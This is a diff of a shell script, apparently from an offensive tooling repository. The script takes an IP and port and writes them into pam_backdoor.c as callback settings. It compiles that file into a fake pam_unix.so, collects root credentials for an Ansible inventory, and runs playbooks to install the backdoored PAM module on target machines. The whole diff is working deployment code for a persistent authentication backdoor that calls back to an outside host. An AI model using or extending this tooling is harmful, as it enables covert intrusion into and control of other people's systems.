@@ -19,6 +19,18 @@ port=$3
 # ubuntu: libpam-modules libpam0g-dev
 # rhel: pam-devel
 
+# Get username and password for ansible
+read -p "Enter username of user with root access on the target machines: " user
+read -p "Enter password of this user: " pass
+
+# Set this username and password in inventory
+sed -i "s/^ansible_user.*/ansible_user=$user/" ./inventory.ini
+sed -i "s/^ansible_password.*/ansible_password=$pass/" ./inventory.ini
+sed -i "s/^ansible_become_password.*/ansible_become_password=$pass/" ./inventory.ini
+
+# Install prereqs using ansible
+ansible-playbook main.yml -t initial
+
 # Change pam_backdoor.c to match callback IP and Port
 sed -i "s/^#define CALLBACK_IP.*/#define CALLBACK_IP \"$ip\"/" ./pam_backdoor.c
 sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT $port/" ./pam_backdoor.c
@@ -30,17 +42,8 @@ sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT $port/" ./pam_backdoor.
 # -l***: Link libpam.so and libdl.so
 gcc -fPIC -shared -o pam_unix.so pam_backdoor.c -lpam -ldl
 
-# Get username and password for ansible
-read -p "Enter username of user with root access on the target machines: " user
-read -p "Enter password of this user: " pass
-
-# Set this username and password in inventory
-sed -i "s/^ansible_user.*/ansible_user=$user/" ./inventory.ini
-sed -i "s/^ansible_password.*/ansible_password=$pass/" ./inventory.ini
-sed -i "s/^ansible_become_password.*/ansible_become_password=$pass/" ./inventory.ini
-
 # Run ansible playbook to setup
-ansible-playbook main.yml
+ansible-playbook main.yml -t install
 
 # get OS version
 # os_version=$(cat /etc/*-release | grep "PRETTY_NAME" | sed 's/PRETTY_NAME=//g')
